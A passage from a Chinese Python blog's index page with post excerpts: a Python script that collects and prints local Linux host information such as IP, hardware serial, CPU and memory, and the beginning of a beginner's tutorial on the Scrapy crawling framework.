                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-230207.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2017/01/QQ20170122-230207.png" alt="QQ20170122-230207"></a> 跑一下！效果杠杠滴！！！至于后面的数据持久化（如何保存数据、大家请自行解决哦！比毕竟上一篇博文讲过了、） 这种更适合使用 MongoDB 存储 超级简单好使。 至此本篇博文结束。 这个还有一个分布式的版本、现在不想写了··· 等年后再写吧。 另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。另外我真的一个资源都没看。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/哎哟卧槽" class="author" itemprop="url" rel="index">哎哟卧槽</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2017-01-22 23:34:39" itemprop="dateCreated datePublished" datetime="2017-01-22T23:34:39+08:00">2017-01-22</time>
                </span>
                <span id="/3952.html" class="post-meta-item leancloud_visitors" data-flag-title="小白进阶之Scrapy第二篇（登录篇）" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>10k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>9 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3801.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3801.html" class="post-title-link" itemprop="url">使用Python收集获取Linux系统主机信息</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>使用 python 代码收集主机的系统信息，主要：主机名称、IP、系统版本、服务器厂商、型号、序列号、CPU信息、内存等系统信息。</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">收集主机的信息：</span></span><br><span class="line"><span class="string">主机名称、IP、系统版本、服务器厂商、型号、序列号、CPU信息、内存信息</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取 ifconfig 命令的输出 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getIfconfig</span><span class="params">()</span>:</span></span><br><span class="line">    p = Popen([<span class="string">'ifconfig'</span>], stdout = PIPE)</span><br><span class="line">    data = p.stdout.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取 dmidecode 命令的输出 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDmi</span><span class="params">()</span>:</span></span><br><span class="line">    p = Popen([<span class="string">'dmidecode'</span>], stdout = PIPE)</span><br><span class="line">    data = p.stdout.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="string">''' 根据空行分段落 返回段落列表'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseData</span><span class="params">(data)</span>:</span></span><br><span class="line">    parsed_data = []</span><br><span class="line">    new_line = <span class="string">''</span></span><br><span class="line">    data = [i <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">'\n'</span>) <span class="keyword">if</span> i]</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>].strip():</span><br><span class="line">            parsed_data.append(new_line)</span><br><span class="line">            new_line = line + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_line += line + <span class="string">'\n'</span></span><br><span class="line">    parsed_data.append(new_line)</span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> parsed_data <span class="keyword">if</span> i]</span><br><span class="line"></span><br><span class="line"><span class="string">''' 根据输入的段落数据分析出ifconfig的每个网卡ip信息 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseIfconfig</span><span class="params">(parsed_data)</span>:</span></span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line">    parsed_data = [i <span class="keyword">for</span> i <span class="keyword">in</span> parsed_data <span class="keyword">if</span> <span class="keyword">not</span> i.startswith(<span class="string">'lo'</span>)]</span><br><span class="line">    <span class="keyword">for</span> lines <span class="keyword">in</span> parsed_data:</span><br><span class="line">        line_list = lines.split(<span class="string">'\n'</span>)</span><br><span class="line">        devname = line_list[<span class="number">0</span>].split()[<span class="number">0</span>]</span><br><span class="line">        macaddr = line_list[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line">        ipaddr  = line_list[<span class="number">1</span>].split()[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dic[<span class="string">'ip'</span>] = ipaddr</span><br><span class="line">    <span class="keyword">return</span> dic</span><br><span class="line"></span><br><span class="line"><span class="string">''' 根据输入的dmi段落数据 分析出指定参数 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseDmi</span><span class="params">(parsed_data)</span>:</span></span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line">    parsed_data = [i <span class="keyword">for</span> i <span class="keyword">in</span> parsed_data <span class="keyword">if</span> i.startswith(<span class="string">'System Information'</span>)]</span><br><span class="line">    parsed_data = [i <span class="keyword">for</span> i <span class="keyword">in</span> parsed_data[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>:] <span class="keyword">if</span> i]</span><br><span class="line">    dmi_dic = dict([i.strip().split(<span class="string">':'</span>) <span class="keyword">for</span> i <span class="keyword">in</span> parsed_data])</span><br><span class="line">    dic[<span class="string">'vender'</span>] = dmi_dic[<span class="string">'Manufacturer'</span>].strip()</span><br><span class="line">    dic[<span class="string">'product'</span>] = dmi_dic[<span class="string">'Product Name'</span>].strip()</span><br><span class="line">    dic[<span class="string">'sn'</span>] = dmi_dic[<span class="string">'Serial Number'</span>].strip()</span><br><span class="line">    <span class="keyword">return</span> dic</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取Linux系统主机名称 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHostname</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/sysconfig/network'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fd:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">'HOSTNAME'</span>):</span><br><span class="line">                hostname = line.split(<span class="string">'='</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'hostname'</span>:hostname&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取Linux系统的版本信息 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOsVersion</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/issue'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fd:</span><br><span class="line">            osver = line.strip()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'osver'</span>:osver&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取CPU的型号和CPU的核心数 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCpu</span><span class="params">()</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/proc/cpuinfo'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fd:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">'processor'</span>):</span><br><span class="line">                num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">'model name'</span>):</span><br><span class="line">                cpu_model = line.split(<span class="string">':'</span>)[<span class="number">1</span>].strip().split()</span><br><span class="line">                cpu_model = cpu_model[<span class="number">0</span>] + <span class="string">' '</span> + cpu_model[<span class="number">2</span>]  + <span class="string">' '</span> + cpu_model[<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'cpu_num'</span>:num, <span class="string">'cpu_model'</span>:cpu_model&#125;</span><br><span class="line"></span><br><span class="line"><span class="string">''' 获取Linux系统的总物理内存 '''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMemory</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/proc/meminfo'</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fd:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">'MemTotal'</span>):</span><br><span class="line">                mem = int(line.split()[<span class="number">1</span>].strip())</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    mem = <span class="string">'%.f'</span> % (mem / <span class="number">1024.0</span>) + <span class="string">' MB'</span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">'Memory'</span>:mem&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    dic = &#123;&#125;</span><br><span class="line">    data_ip = getIfconfig()</span><br><span class="line">    parsed_data_ip = parseData(data_ip)</span><br><span class="line">    ip = parseIfconfig(parsed_data_ip)</span><br><span class="line">    </span><br><span class="line">    data_dmi = getDmi()</span><br><span class="line">    parsed_data_dmi = parseData(data_dmi)</span><br><span class="line">    dmi = parseDmi(parsed_data_dmi)</span><br><span class="line"></span><br><span class="line">    hostname = getHostname()</span><br><span class="line">    osver = getOsVersion()</span><br><span class="line">    cpu = getCpu()</span><br><span class="line">    mem = getMemory()</span><br><span class="line">    </span><br><span class="line">    dic.update(ip)</span><br><span class="line">    dic.update(dmi)</span><br><span class="line">    dic.update(hostname)</span><br><span class="line">    dic.update(osver)</span><br><span class="line">    dic.update(cpu)</span><br><span class="line">    dic.update(mem)</span><br><span class="line"></span><br><span class="line">    <span class="string">''' 将获取到的所有数据信息并按简单格式对齐显示 '''</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> dic.items():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%-10s:%s'</span> % (k, v)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>实验测试结果：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">product   :VMware Virtual Platform</span><br><span class="line">osver     :CentOS release <span class="number">6.4</span> (Final)</span><br><span class="line">sn        :VMware<span class="number">-56</span> <span class="number">4</span>d b4 <span class="number">6</span>c <span class="number">05</span> e5 <span class="number">20</span> dc-c6 <span class="number">49</span> <span class="number">0</span>c e1 e0 <span class="number">18</span> <span class="number">1</span>c <span class="number">75</span></span><br><span class="line">Memory    :<span class="number">1870</span> MB</span><br><span class="line">cpu_num   :<span class="number">2</span></span><br><span class="line">ip        :<span class="number">192.168</span><span class="number">.0</span><span class="number">.8</span></span><br><span class="line">vender    :VMware, Inc.</span><br><span class="line">hostname  :vip</span><br><span class="line">cpu_model :Intel(R) i7<span class="number">-4710</span>MQ <span class="number">2.50</span>GHz</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/李伟" class="author" itemprop="url" rel="index">李伟</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-12-19 21:22:20" itemprop="dateCreated datePublished" datetime="2016-12-19T21:22:20+08:00">2016-12-19</time>
                </span>
                <span id="/3801.html" class="post-meta-item leancloud_visitors" data-flag-title="使用Python收集获取Linux系统主机信息" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>3.1k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>3 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3472.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3472.html" class="post-title-link" itemprop="url">小白进阶之Scrapy第一篇</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>这博文写得我懒癌犯了，最后的那个章节内容排序，我没有实验是否是正确的，不过这只是个教大家用 Scrapy 的教程，正确与否并不重要··· 如果不正确，记得留言；等我懒癌过了，我再改改······ 还有其它的问题也是一样··· ，把问题留言下； 等我懒癌过了·· 我改回来！嗯！是等我懒癌结束了，再改。 前面几篇博文，给大家从头到尾做了一个比较高效的爬虫，从这篇起来说说 Python 的爬虫框架 Scrapy； 至于为什么要说框架呢？因为啊，框架可以帮我们处理一部分事情，比如下载模块不用我们自己写了，我们只需专注于提取数据就好了； 最重要的一点啊！框架使用了异步的模式;可以加快我们的下载速度，而不用自己去实现异步框架；毕竟实现异步爬虫是一件比较麻烦的事情。 不过啊！反爬虫这个坎还是要我们自己迈过去啊！这是后话，以后再说。我们先来让 Scrapy 能跑起来，并提取出我们需要的数据，再解决其它问题。 官方文档在这儿：点我 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/9555112.jpg" alt="9555112"></a> <strong>环境搭建：</strong> 关于这一点，对在 Windows 环境下使用的小伙伴来说，请务必使用我之前提到的 Anaconda 这个 Python 的发行版本，不然光环境的各种报错就能消磨掉你所有的学习兴趣！ <strong>下载地址在这儿：<a href="http://pan.baidu.com/s/1pLgySav" target="_blank" rel="noopener">http://pan.baidu.com/s/1pLgySav</a></strong> 安装完成之后，在 cmd 中执行：conda install Scrapy (如果需要使用特定版本，请在 Scrapy 后面加上 ==XXXX XXXX 代表你需要的版本号) 下面是安装示意图： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/安装Scrapy.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/安装Scrapy.gif" alt="安装Scrapy"></a> So Easy@@！环境搭建完成！是不是超简单？全程无痛啊！ 下面开始踏上新的征程！Go Go Go！！ 使用 Scrapy 第一步：创建项目；CMD 进入你需要放置项目的目录 输入：</p>
                  <figure class="highlight mipsasm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">scrapy </span>startproject XXXXX             XXXXX代表你项目的名字</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/创建项目.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/创建项目.gif" alt="创建项目"></a> OK 项目创建完成。现在可以开始我们的爬取之旅了！ 下面是目录中各个文件的作用 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/各个文件的作用.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/各个文件的作用.png" alt="各个文件的作用"></a> 好了，目录我们认识完了，在开始之前给大家一个小技巧，Scrapy 默认是不能在 IDE 中调试的，我们在根目录中新建一个 py 文件叫：entrypoint.py；在里面写入以下内容：</p>
                  <figure class="highlight smali">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">from scrapy.cmdline import execute</span><br><span class="line">execute(['scrapy', 'crawl', 'dingdian'])</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><strong>注意！第二行中代码中的前两个参数是不变的，第三个参数请使用自己的 spider 的名字。稍后我会讲到！！</strong> 现在整个目录看起来是这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/快捷启动.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/11/快捷启动.png" alt="快捷启动"></a> 基础工作准备完毕！我们来说说基本思路。 上面的准备工作完成之后，我们先不要着急开始工作，毕竟作为一个框架，还是很复杂的；贸然上手 开整，很容易陷入懵逼状态啊！一团浆糊，理不清思路，后面的事情做起来很很麻烦啦！ 我们来看看下面这张图： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy_architecture.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/scrapy_architecture.png" alt="scrapy_architecture"></a> 这就是整个 Scrapy 的架构图了； <strong>Scrapy Engine: 这是引擎，负责 Spiders、ItemPipeline、Downloader、Scheduler 中间的通讯，信号、数据传递等等！（像不像人的身体？）</strong> <strong>Scheduler(调度器): 它负责接受引擎发送过来的 requests 请求，并按照一定的方式进行整理排列，入队、并等待 Scrapy Engine(引擎)来请求时，交给引擎。</strong> <strong>Downloader（下载器）：负责下载 Scrapy Engine(引擎)发送的所有 Requests 请求，并将其获取到的 Responses 交还给 Scrapy Engine(引擎)，由引擎交给 Spiders 来处理，</strong> <strong>Spiders：它负责处理所有 Responses,从中分析提取数据，获取 Item 字段需要的数据，并将需要跟进的 URL 提交给引擎，再次进入 Scheduler(调度器)，</strong> <strong>Item Pipeline：它负责处理 Spiders 中获取到的 Item，并进行处理，比如去重，持久化存储（存数据库，写入文件，总之就是保存数据用的）</strong> <strong>Downloader Middlewares（下载中间件）：你可以当作是一个可以自定义扩展下载功能的组件</strong> <strong>Spider Middlewares（Spider 中间件）：你可以理解为是一个可以自定扩展和操作引擎和 Spiders 中间‘通信‘的功能组件（比如进入 Spiders 的 Responses;和从 Spiders 出去的 Requests）</strong> <strong>数据在整个 Scrapy 的流向：</strong> 程序运行的时候， <strong>引擎：</strong>Hi！Spider, 你要处理哪一个网站？ <strong>Spiders：</strong>我要处理 23wx.com <strong>引擎：</strong>你把第一个需要的处理的 URL 给我吧。 <strong>Spiders：</strong>给你第一个 URL 是 XXXXXXX.com <strong>引擎：</strong>Hi！调度器，我这有 request 你帮我排序入队一下。 <strong>调度器：</strong>好的，正在处理你等一下。 <strong>引擎：</strong>Hi！调度器，把你处理好的 request 给我， <strong>调度器：</strong>给你，这是我处理好的 request <strong>引擎：</strong>Hi！下载器，你按照下载中间件的设置帮我下载一下这个 request <strong>下载器：</strong>好的！给你，这是下载好的东西。（如果失败：不好意思，这个 request 下载失败，然后<strong>引擎</strong>告诉<strong>调度器</strong>，这个 request 下载失败了，你记录一下，我们待会儿再下载。） <strong>引擎：</strong>Hi！Spiders，这是下载好的东西，并且已经按照 Spider 中间件处理过了，你处理一下（<strong>注意！这儿 responses 默认是交给 def parse 这个函数处理的</strong>） <strong>Spiders：（处理完毕数据之后对于需要跟进的 URL）</strong>，Hi！<strong>引擎</strong>，这是我需要跟进的 URL，将它的 responses 交给函数 def xxxx(self, responses)处理。还有这是我获取到的 Item。 <strong>引擎</strong>：Hi ！<strong>Item Pipeline</strong> 我这儿有个 item 你帮我处理一下！<strong>调度器！</strong>这是我需要的 URL 你帮我处理下。然后从第四步开始循环，直到获取到你需要的信息， 注意！只有当调度器中不存在任何 request 了，整个程序才会停止，（也就是说，对于下载失败的ＵＲＬ，Scrapy 会重新下载。） 以上就是 Scrapy 整个流程了。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a> 大家将就着看看。 建立一个项目之后： <strong>第一件事情</strong>是在 items.py 文件中定义一些字段，这些字段用来临时存储你需要保存的数据。方便后面保存数据到其他地方，比如数据库 或者 本地文本之类的。 <strong>第二件事情</strong>在 spiders 文件夹中编写自己的爬虫 <strong>第三件事情</strong>在 pipelines.py 中存储自己的数据 <strong>还有一件事情</strong>，不是非做不可的，就 settings.py 文件 并不是一定要编辑的，只有有需要的时候才会编辑。 <strong>建议一点：在大家调试的时候建议大家在 settings.py 中取消下面几行的注释：</strong> <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/设置setting01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/设置setting01.png" alt="设置setting01"></a> 这几行注释的作用是，Scrapy 会缓存你有的 Requests!当你再次请求时，如果存在缓存文档则返回缓存文档，而不是去网站请求，这样既加快了本地调试速度，也减轻了 网站的压力。一举多得 <strong>第一步定义字段：</strong> 好了，我们来做 第一步 定义一些字段；那具体我们要定义那些字段呢？ 这个根据自己需要的提取的内容来定义。 比如：我们爬取小说站点都需要提取些什么数据啊？ 小说名字、作者、小说地址、连载状态、连载字数、文章类别 就像下面这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy01.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy01.png" alt="Scrapy01"></a> 这样我们第一步就完成啦！是不是 So Easy？ヾ(<em>´▽‘</em>)ﾉ ； 下面开始重点了哦！编写 spider（就是我们用来提取数据的爬虫了） <strong>第二步编写 Spider：</strong> 在 spiders 文件中新建一个 dingdian.py 文件 并导入我们需用的模块 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy02.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/12/Scrapy02.png" alt="Scrapy02"></a> <strong>PS：Scrapy 中 Response 可以直接使用 Xpath 来解析数据；不过大家也可以使用自己习惯的包，比如我导入的 BS4 、re ；当然也可以使其他比如 pyquery 之类的。这个并没有什么限制</strong> <strong>另外或许个别小伙伴会遇到 from dingdian.items import DingdianItem 这个导入失败的情况；可以试试把项目文件移动到根目录。</strong> <strong>Request 这个模块可以用来重写单独请求一个 URL，用于我们后面跟进 URL。</strong> 好了开整；首先我们需要什么？ 我们需要从一个地址入手开始爬取，我在顶点小说上没有发现有全站小说地址，但是我找到每个分类地址全部小说： 玄幻魔幻：<a href="http://www.23wx.com/class/1_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/1_1.html</a> 武侠修真：<a href="http://www.23wx.com/class/2_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/2_1.html</a> 都市言情：<a href="http://www.23wx.com/class/3_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/3_1.html</a> 历史军事：<a href="http://www.23wx.com/class/4_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/4_1.html</a> 侦探推理：<a href="http://www.23wx.com/class/5_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/5_1.html</a> 网游动漫：<a href="http://www.23wx.com/class/6_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/6_1.html</a> 科幻小说：<a href="http://www.23wx.com/class/7_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/7_1.html</a> 恐怖灵异：<a href="http://www.23wx.com/class/8_1.html" target="_blank" rel="noopener">http://www.23wx.com/class/8_1.html</a> 散文诗词：<a 